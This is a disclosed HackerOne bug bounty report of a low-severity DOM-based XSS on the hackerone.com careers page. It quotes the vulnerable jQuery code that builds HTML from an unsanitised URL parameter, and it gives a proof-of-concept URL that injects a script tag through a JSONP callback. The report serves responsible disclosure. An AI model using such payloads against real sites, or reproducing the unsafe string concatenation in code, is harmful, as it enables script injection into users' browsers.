# Cross-site Scripting (XSS) on HackerOne careers page

## Report Details
- **Report ID**: 474656
- **URL**: https://hackerone.com/reports/474656
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-01-04T13:49:31.861Z
- **Disclosed**: 2019-02-17T23:18:46.382Z

## Reporter
- **Username**: nguyenlv7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Dear HackerOne team,
**Summary:**
I found DOM XSS at endpoint `https://www.hackerone.com/careers`, but can not bypass CSP. It's work on IE and Edge.

### Steps To Reproduce
- JS file is "Masonry js file", vulnerability code:

```javascript
//Checking for potential Lever source or origin parameters
var pageUrl = window.location.href;
var leverParameter = '';
var trackingPrefix = '?lever-'

if( pageUrl.indexOf(trackingPrefix) >= 0){
  // Found Lever parameter
  var pageUrlSplit = pageUrl.split(trackingPrefix);
  leverParameter = '?lever-'+pageUrlSplit[1];
}
```
```javascript
 var link = posting.hostedUrl+leverParameter;
    
    	jQuery('#jobs-container .jobs-list').append(
      '<div class="job '+teamCleanString+' '+locationCleanString.replace(',', '')+' '+commitmentCleanString+'">' +
        '<a class="job-title" href="'+link+'"">'+title+'</a>' +
        '<p class="tags"><span>'+team+'</span><span>'+location+'</span><span>'+commitment+'</span></p>' +
        '<p class="description">'+shortDescription+'</p>' +
        '<a class="btn" href="'+link+'">Learn more</a>' +
      '</div>'  
    
      );
```
-  `link` variable is append by jquery.
- POC: `https://www.hackerone.com/careers?lever-#aaa"><script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert"></script>`

### Optional: Your Environment (Browser version, Device, etc)

 * IE, Edge (because url is encoded on firefox and chrome)

### Optional: Supporting Material/References (Screenshots)
 {F400895}
{F400896}

## Impact

* XSS but can not bypass CSP
* inject html code

## Attachments
- dom_xss_h1.JPG
- inject_html.JPG
